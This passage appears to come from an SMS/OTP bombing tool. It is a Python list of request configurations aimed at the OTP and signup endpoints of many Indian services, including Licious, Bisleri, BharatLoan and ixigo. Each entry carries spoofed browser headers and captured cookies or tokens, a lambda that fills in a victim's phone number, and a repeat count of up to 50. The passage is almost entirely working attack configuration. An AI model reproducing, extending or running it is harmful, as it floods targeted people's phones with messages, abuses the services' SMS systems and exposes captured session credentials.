            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "xsrf-token": "OP9zTOUO-KF2BfPbXRH6JwwWcsE1QiHdq7eM"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "nod": 4}),
        "count": 2
    },
    
    {
        "url": "https://portal.myma.in/custom-api/auth/generateotp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://app.myma.in",
            "priority": "u=1, i",
            "referer": "https://app.myma.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"countrycode": "+91", "mobile": f"91{phone}", "is_otpgenerated": False, "app_version": "-1"}),
        "count": 6
    },
    
    {
        "url": "https://api.freedo.rentals/customer/sendOtpForSignUp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://freedo.rentals",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://freedo.rentals/",
            "requestfrom": "customer",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-bn": "2.0.16",
            "x-channel": "WEB",
            "x-client-id": "FREEDO",
            "x-platform": "CUSTOMER"
        },
        "data": lambda phone: json.dumps({"email_id": "cokiwav528@avastu.com", "first_name": "Haiii", "mobile_number": phone}),
        "count": 6
    },
    
    {
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "source=website; _gid=GA1.2.1957294880.1719308075; WZRK_G=fd462bffc0674ad3bdf9f6b7c537c6c7; _gat=1; _gcl_au=1.1.1898387226.1719308076; ajs_anonymous_id=f59e4a4c-db21-44c5-b067-2c942debda44; location=eyJjaXBoZXJ0ZXh0IjoidWp4RnBDeXpKZU1UVHV2THJnbjZSNHZlRWRXTXRmQWhaUlJYakZJVlFFRHV1a3FkQnBwT2hTOEVwc1h4Q1ltTUJKSXozUWMxRHZUYnIvTE1LNU52VG1IVytBTEc0ZDR5dktnZ1B6MjRBWUxQK0ZzRGxScmJMTXo3MU85bDJXdStISDhuQmdYRkZ5eEdteU44VVBqbDFlTzV5dEQvY1NSQTZ1MitORzhIajZKZXJma093QjJ1a2tVeEJrYWtIQWRmaHE3d0E4Sm41cWtCQmNYNUZxUUk0S1RYVjZudHBXYTBPcEViVHkxMmVuNEZjUXAyb2ZzU2M4eTkvWTlvWnV4UFNFZ0x6M0tTMXlmc0ZBN25MUWZ6RG0rbkt1SE5sMVpLMDFkU0VXaHVPMmQxUlFZemJ3NzF4QWsveWNUSDBwS2JoaitUaEZJY1M0NFZLWmsrK3A4K0VSU2pqNDJ2RG5RZU05NVUrYVEzOFI2UUR4RWRDV3hubVdoL3oyRWg0ZFJyIiwiaXYiOiI1YzlmNjlmMGNmOGY3ZjgwMWU3ZTEzZWRkNzQ5MDVmNiIsInNhbHQiOiJjZGMzYTZkNTI5Nzc3MWJmN2UzODE1NDI1ZmQ1YzYwZWM2MDU2N2U0ZmRhMzQ5ODg1OTQxYTM0MTFhODBjNDgyOTdhZTA1M2Q1ZjcxOWJkMWQ0OTk0OGEwYTU0ZjYzYjE0YmQ0NDc5NTAyZWZjZWFlOGQyMDM3MDQ3NzM3NmI4NTQxOWVhYmJlZDc1YWVlMTY2NjE1NzM3MzRhYTUxOWJmY2ExZGIxYzQ2MmU1NzBmNzQ1NDIwM2JhZWFjYmNmOGQ5MTQ3OThjNDEwNjllYWJhM2ViY2Q5Y2E4OTUwMDJmOTQ2YTIyYjllZjE4ZGJkZWZjZTg0YTU0OGU3MWFkMTEwZDc4MmZjNDVhYjYxYzg4ZWY1ZmRkODM3NGE1ZTkxODg2N2NjZDc3ODA0MmQzYjUzMmFjMzVkMTVmYjU0NzQ3NmY1Njg0NjJmNmE2Y2I2MTQ2NjZjODU1ZThjOWI0ZWMyZGVlOTlmMTdiZDkxZjMwMDI1NGMyMTNjOGUzNTY4YTEyNjFhZGY4ZTYxMGZmYmIxZmZiODgzMDQ5OGIxNGMyYzk5NDI4ODY1MmYzZjcxOTExOWFiZTRjODQyZTk4MjAxNDlmOWJiZDU4ZTgzMmYyYWI3OTQzZWY3YThjYjc1NDFjZjIxZGUxM2FkOTQ0ZGRkZjdjOTk1MTlmYTk4ZGE0MiIsIml0ZXJhdGlvbnMiOjk5OX0=; _ga_YN0TX18PEE=GS1.1.1719308076.1.1.1719308104.0.0.0; _ga=GA1.1.2028763947.1719308075; nxt=eyJjaXBoZXJ0ZXh0IjoiUXB4VkE1a2swL0FQQzB4SytuUzdiSVNaUDJkOS8rNDNEb2orQktNTVdhST0iLCJpdiI6Ijk1NTBiZDY1NzYwYjYxNGU1MDZkZTEzZjk5ODFlZThkIiwic2FsdCI6ImVjYzQ0MTNjZTllOGJhNTA3OTJjYzhmZTMyZjc0NTQ1MzI5NTNhNmY5Mjg1NWU4MmMzMzA0MWZiODc1ZmQzNTIyZjcyMjllZTViNTRmY2Y5YTVjYzJlYThkMDFlNGJhOTA0NDA5OGYxMjVhMDIxYTUzYzY3ZDA2N2I0MjJhNDAwM2U3NGUxOGVlYTIzZGE5YTUyNmQyOTgzYTU5NTQ0MjlhMTRiOTAzZDJjY2RlNTIyNmI3ZmI3MjdjZmVkMTJkZGQ4OTgzMWQ4MTJjYWMxMTRhMjI1MmEwMjFjOWYxYTM2NzFhOTVkZmUxNjNhNjI4ZjYxYzg3MWI4ZWQzZTUzN2NjOGM1YTNlNjQzNDdlYjY5MzQ0MWU2YWZjYTkyODlkMTcxOGQ2ODI5ZTJkN2Y1MjhhNzQzNjY4OGRmMjFmZGJiNWEwYWM5NTYyODMyNTQ4NzJhOThmOWEyODA2ZDhjZmVmNWNkOTA2MmE0NDc3YjY0ODk3ZGQ1Y2RlNjEyZWFhOTdmMGI1MDEwNDE2MjRkNzUyNDg5NDIyYmE0MmQwMzFjZGI2NWU1NjA5NTQ3ZjA2ZGQ0MDVmNjZjM2VmYjIzZWFjOTk1MTM4MTEzZGE5ZTFkNjFkYWFmZDJlMDJlOWZkMGEzNDVmMDNiNjFhNzU5OTlmYTM3NmZjZjIwMTIwOTUwIiwiaXRlcmF0aW9ucyI6OTk5fQ==; WZRK_S_445-488-5W5Z=%7B%22p%22%3A3%2C%22s%22%3A1719308078%2C%22t%22%3A1719308110%7D",
            "origin": "https://www.licious.in",
            "priority": "u=1, i",
            "referer": "https://www.licious.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "serverside": "false",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-csrf-token": ""
        },
        "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
        "count": 3
    },
    
    {
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cosmofeed-request-id": "fe247a51-c977-4882-a9b8-fe303692ddc3",
            "origin": "https://superprofile.bio",
            "priority": "u=1, i",
            "referer": "https://superprofile.bio/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phoneNumber": phone, "countryCode": "+91", "data": {"email": "abcd2@gmail.com"}, "authScreen": "signup-screen", "userIsConvertingToCreator": False}),
        "count": 1
    },
    
    {
        "url": "https://apis.bisleri.com/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.bisleri.com",
            "priority": "u=1, i",
            "referer": "https://www.bisleri.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-requested-with": "7Yhm6b86qTsrpcMWtUixPLnv02nHf3wFf5vkukwu"
        },
        "data": lambda phone: json.dumps({"email": "abfhhfhcd@gmail.com", "mobile": phone}),
        "count": 20
    },
    
    {
        "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        "method": "POST",
        "headers": {
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Referer": "https://pharmacy.evitalrx.in/",
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"pharmacy_name": "hfhfjfgfhkf", "mobile": phone, "referral_code": "", "email_id": "jhvd@gmail.com", "zip_code": "110086", "device_id": "f2cea99f-381d-432d-bd27-02bc6678fa93", "app_version": "desktop", "device_name": "Chrome", "device_model": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36", "device_manufacture": "Windows", "device_release": "windows-10", "device_sdk_version": "126.0.0.0"}),
        "count": 3
    },
    
    {
        "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
        "method": "POST",
        "headers": {
            "APP-TOKEN": "s16-q9fz-jy3p-rk",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIwIiwiaXNzIjoiUXVpY2tSaWRlIiwiaWF0IjoxNTI2ODg2NzU1fQ.nsy3UbPnaANf7d3O0xAW3LTG1P-dgcEhgqwOey-IK2kFCGxr298jfLKkE2k6taTvzETpJMPpertJu3uzJDtDUQ",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "_ga_S6LZW9RD9Z=GS1.1.1719144863.1.0.1719144863.0.0.0; _ga=GA1.2.2033204632.1719144864; _gid=GA1.2.502724273.1719144864; _gat_gtag_UA_139055405_3=1; _gat_UA-139055405-3=1",
            "Origin": "https://pwa.getquickride.com",
            "Referer": "https://pwa.getquickride.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride&payload=&signature=&signatureAlgo=&domainName=pwa.getquickride.com",
        "count": 5
    },
    
    {
        "url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true&email=&is_otp=True&token",
        "method": "GET",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cookie": 'comp_par="utm_campaign=70553\054firstclicktime=2024-06-23 17:18:10.351125\054utm_medium=ppc\054http_referer=https://www.google.com/\054utm_source=10001"; cr_id_last=None; last_source_time="2024-06-23 17:18:10.351039"; last_source=10001; nur=None; sessionid=2kp1dzotrgpe698bfanq4tp4qechv2ln; data_in_visits="10001&2024-06-23 17:18:10.350961\054"; csrftoken=UrmVVY4g3YmpffRV3Rdznqrq2kBLItpN; utm_campaign_last=70553; __cf_bm=HdXzeqlgG6io1sY6qie2eVJ74XMfXuLRNJIs.oTzbho-1719143290-1.0.1.1-Op8tdLoYJnUoaXpFfk927ZZafyzjr3qZ5z2ejJCkf8HmQTPzaaGR.erei72oVEdSsJx_1XTH1zQNpmsn9zLAig; _cfuvid=T_lLlwC6IEneinYAELiGdaxZlBaqKOZ8upanwvhyZiE-1719143290370-0.0.1.1-604800000; fw_utm={%22value%22:%22{%5C%22utm_source%5C%22:%5C%2210001%5C%22%2C%5C%22utm_medium%5C%22:%5C%22ppc%5C%22%2C%5C%22utm_campaign%5C%22:%5C%2270553%5C%22}%22%2C%22createTime%22:%222024-06-23T11:48:13.312Z%22}; fw_uid={%22value%22:%2292f5a144-b31b-4b24-96c6-d894804e5039%22%2C%22createTime%22:%222024-06-23T11:48:13.337Z%22}; fw_se={%22value%22:%22fws2.c48f4a93-0256-4df1-ae3f-2d33f47d61d6.1.1719143293468%22%2C%22createTime%22:%222024-06-23T11:48:13.468Z%22}; G_ENABLED_IDPS=google; _gid=GA1.2.767062449.1719143297; _gac_UA-62869587-1=1.1719143297.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _gcl_au=1.1.385881254.1719143298; _gcl_gs=2.1.k1$i1719143288; _gac_UA-62869587-2=1.1719143298.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _fbp=fb.1.1719143298995.264854070543037114; _ga_MF23YQ1Y0R=GS1.2.1719143300.1.0.1719143300.60.0.0; _ga=GA1.1.991595777.1719143297; _gcl_aw=GCL.1719143303.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _ga_TC6QEKJ4BS=GS1.1.1719143302.1.0.1719143302.60.0.0; _ga_ZMCTPTF5ZP=GS1.2.1719143304.1.0.1719143304.60.0.0; _clck=ggl1zg%7C2%7Cfmv%7C0%7C1635; _clsk=1iq7ave%7C1719143306731%7C1%7C1%7Cr.clarity.ms%2Fcollect; moe_uuid=b79017f8-6aad-4af9-b387-8dfef3749d3f',
            "priority": "u=1, i",
            "referer": "https://www.clovia.com/?utm_source=10001&utm_medium=ppc&utm_term=clovia_brand&utm_campaign=70553&gad_source=1&gclid=EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 5
    },
    
    {
        "url": "https://admin.kwikfixauto.in/api/auth/signupotp/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://kwikfixauto.in",
            "priority": "u=1, i",
            "referer": "https://kwikfixauto.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 3
    },
    
    {
        "url": "https://www.brevistay.com/cst/app-api/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "authorization": "Bearer null",
            "brevi-channel": "DESKTOP_WEB",
            "brevi-channel-version": "40.0.0",
            "content-type": "application/json",
            "cookie": "WZRK_G=e35f2d1372894c078327721b0dce1643; PHPSESSID=t012m1s7ml0b1hrrt0clq063a0; _gcl_au=1.1.450954870.1719050061; _gid=GA1.2.2009705537.1719050079; _gat_UA-76491234-1=1; _ga_WRZEGYZRTW=GS1.1.1719050079.1.0.1719050079.0.0.1234332753; WZRK_S_R9Z-654-466Z=%7B%22p%22%3A2%2C%22s%22%3A1719050070%2C%22t%22%3A1719050079%7D; _clck=jleo6d%7C2%7Cfmu%7C0%7C1634; FPID=FPID2.2.as0IAmsiCa%2FP1407PbQfVL1Cc6nZ8u9zt2atD67UFIg%3D.1719050076; FPGSID=1.1719050080.1719050080.G-WRZEGYZRTW.SFwCEJeloGt9Yand3iX5MA; _fbp=fb.1.1719050080798.755777096366214429; FPLC=SlslklfyB3CaJY%2FHqIBvl5T3%2BI4dZHhl0NlWIJSwxvEmGnCsD4K%2Fechm2wpS0K3EgQCtOmHpqIBDQYTq5BsZTmC%2BDvjIVHjpREcazaWVfqimPEXJb5W63br788Qq2g%3D%3D; _clsk=1r9n9qk%7C1719050081944%7C1%7C1%7Cq.clarity.ms%2Fcollect; _ga=GA1.2.1921624223.1719050076; _ga_B5ZBCV939N=GS1.1.1719050079.1.0.1719050085.54.0.0",
            "origin": "https://www.brevistay.com",
            "priority": "u=1, i",
            "referer": "https://www.brevistay.com/login?red=/hotels-in-lucknow",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"is_otp": 1, "is_password": 0, "mobile": phone}),
        "count": 15
    },
    
    {
        "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Cookie": "_gcl_au=1.1.994375249.1719049925; _ga=GA1.1.2131701644.1719049925; _ga_Q8HTW71CLJ=GS1.1.1719049925.1.1.1719049936.49.0.0; _ga_BLPG4SY73M=GS1.1.1719049925.1.1.1719049944.41.0.0; _ga_E0K0Q2R7S0=GS1.1.1719049925.1.1.1719049944.0.0.0",
            "Origin": "https://hourlyrooms.co.in",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "access-control-allow-credentials": "true",
            "access-control-allow-origin": "*",
            "content-type": "application/json",
            "platform": "web-2.0.0",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 1
    },
    
    {
        "url": "https://api.madrasmandi.in/api/v1/auth/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryBBzDmO8qIRlvPMMZ",
            "delivery-type": "instant",
            "mm-build-version": "1.0.1",
            "mm-device-type": "web",
            "origin": "https://madrasmandi.in",
            "priority": "u=1, i",
            "referer": "https://madrasmandi.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f'------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{phone}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n',
        "count": 3
    },
    
    {
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "ci_session=2s7ip3dak5aif2ka77sd2bn9i4nluq2h; _ga=GA1.1.963974262.1718969064; _gcl_au=1.1.1625156903.1718969064; _fbp=fb.1.1718969073282.994122455798043230; _ga_EWGNR5NDJB=GS1.1.1718969063.1.1.1718969167.41.0.0",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
        "count": 50
    },
    
    {
        "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "appversioncode": "5268",
            "clientbuildnumber": "5268",
            "clientplatform": "WEB",
            "content-type": "application/json",
            "origin": "https://web.pagarbook.com",
            "priority": "u=1, i",
            "referer": "https://web.pagarbook.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "userrole": "EMPLOYER"
        },
        "data": lambda phone: json.dumps({"phone": phone, "language": 1}),
        "count": 5
    },
    
    {
        "url": "https://api.vahak.in/v1/u/o_w",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.vahak.in",
            "priority": "u=1, i",
            "referer": "https://www.vahak.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "scope": 0, "request_meta_data": "X0oLFl9sAAZzHuhTmaHk5Bbd+HFZDh+P9J6JhPghG2V1Ymi6OPEu0TH1vS2J2tc58KI/YpjG5tiqVlDkbBCMQCneV7fXtTsYRjhF8FfVNac=", "is_whatsapp": False}),
        "count": 1
    },
    
    {
        "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://redcliffelabs.com",
            "priority": "u=1, i",
            "referer": "https://redcliffelabs.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "short": True}),
        "count": 1
    },
    
    {
        "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "apikey": "ixiweb\u00212$",
            "clientid": "ixiweb",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": "__cf_bm=FdtmIxlX4PNfSpwYX1qvSdA99iOf9abzGUc7BSSoACw-1715442021-1.0.1.1-74e8P2QKatyvbBQjT7F7nqmbRS2wUmHIqJgmxxVi52EciJqdP_sqwydnwciOjrV8mWhS6v8d2XeMCAckwcbGzA; ixiUID=dc8e7b027263440b83a8; ixiSrc=3J4Sv1FzWiz+BBr0b5qy7LAESHlzQ1ym3JiFkuSC7S5GBZftf5jJ+0yO8gbj/stz5lWZnyT8gvEVf83M6I4pxA==; ixigoSrc=dc8e7b027263440b83a8|DIR:11052024|DIR:11052024|DIR:11052024; _gcl_au=1.1.78477619.1715442051; _ga=GA1.1.92728914.1715442053; _ym_uid=1715442054910529504; _ym_d=1715442054; _ym_isad=2; _ga_LJX9T6MDKX=GS1.1.1715442052.1.1.1715442087.25.0.1092021780; WZRK_G=dd46574995934bd09d3eef419c5501fe; WZRK_S_R5Z-849-WZ4Z=%7B%22p%22%3A1%2C%22s%22%3A1715442104%2C%22t%22%3A1715442223%7D",
            "deviceid": "dc8e7b027263440b83a8",
            "devicetime": "1715442205998",
            "gauth": "0.37EEF3ifZtJrSlsXYM3Jh31RMw1-QXORNR98Jtxx7eFsy48fe3rtoB6fTsPrhJKj9iIq25m-6BK30NAitgfSHcRQ8D9FSVzyFc4Rk4hNYn3Cj7EgBiIaPiIX1UyBrSdNM9p9WYpGH-ijc23okhxAZRhzx_BsPuyU3cPdgDjg1jAIAG_AOYxDZYSDjXBn7wDGv7sak0a4zCLwDef2PT5-pI0ecNnyLKEpNnFUg5O9955k_KjT8g0KuijkxQzMjQTMiqN917tCfcMDaZG1oYmcJjHU7eNxVwrsspE7YKEtrRXW58GAUJdhyFq95PmryvpLcDb3XxFwRw1R_YQgvCHyhPuaiw3WKrXR2Lq_XAgyz4eqv9gLGnSETFQ31dmAfPLcluZow_F7FwEJ_MNK5Q-m7YtO3UHRXMFogYOHtRixfHNu5uptz-tel8SXi414WDyX3VMftHjLgd7IUPaljlOASQ.3JCfm9KSGd3dfmd60LLg2A.fa41f75bb9ec89c96f7f89193863715eef60f7b71dc2d2846ce7de61449ecc4d",
            "ixisrc": "3J4Sv1FzWiz+BBr0b5qy7LAESHlzQ1ym3JiFkuSC7S5GBZftf5jJ+0yO8gbj/stz5lWZnyT8gvEVf83M6I4pxA",
            "origin": "https://www.ixigo.com",
            "priority": "u=1, i",
            "referer": "https://www.ixigo.com/?loginVisible=true",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "uuid": "dc8e7b027263440b83a8"
        },
